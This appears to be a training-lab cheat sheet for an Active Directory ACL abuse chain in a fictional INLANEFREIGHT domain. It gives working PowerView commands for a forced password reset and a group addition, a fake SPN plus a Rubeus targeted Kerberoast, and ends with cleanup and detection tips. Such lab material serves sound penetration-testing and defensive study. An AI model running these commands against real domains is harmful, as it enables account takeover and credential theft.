## 🧬 ACL Abuse Chain (wley → damundsen → IT → adunn → DCSync)

### 1️⃣ Reset `damundsen`’s password as **wley**

```powershell
# Log in as wley
$SecPassword = ConvertTo-SecureString '<WLEY_PASS>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# New password for damundsen
$damPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damPass -Credential $Cred -Verbose
```

---

### 2️⃣ Add `damundsen` to **Help Desk Level 1** (uses GenericWrite)

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

Add-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

Because Help Desk Level 1 is nested in **Information Technology**, `damundsen` now inherits IT rights ⇒ **GenericAll on `adunn`**.

---

### 3️⃣ Targeted Kerberoast on `adunn` (using GenericAll)

1. **Create fake SPN** on `adunn`:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn `
  -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

2. **Kerberoast with Rubeus**:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
# → grab $krb5tgs$ hash, crack with Hashcat
```

Once cracked → log in as **adunn** → perform **DCSync** (covered later).

---

### 4️⃣ Cleanup (order matters)

1. **Remove fake SPN**:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

2. **Remove `damundsen` from Help Desk Level 1**:

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

3. **Restore original password** for `damundsen` (or have client reset).

---

### 5️⃣ Detection & Monitoring (TL;DR)

* **Audit dangerous ACLs** (BloodHound, regular AD reviews).
* **Monitor group membership** of high-impact groups (Help Desk, IT, Domain Admins, etc.).
* **Log & alert on ACL changes** – e.g. Event ID **5136** (object modified).
* Convert SDDL to readable form for investigations:

```powershell
ConvertFrom-SddlString "<SDDL_HERE>" | select -ExpandProperty DiscretionaryAcl
```

---

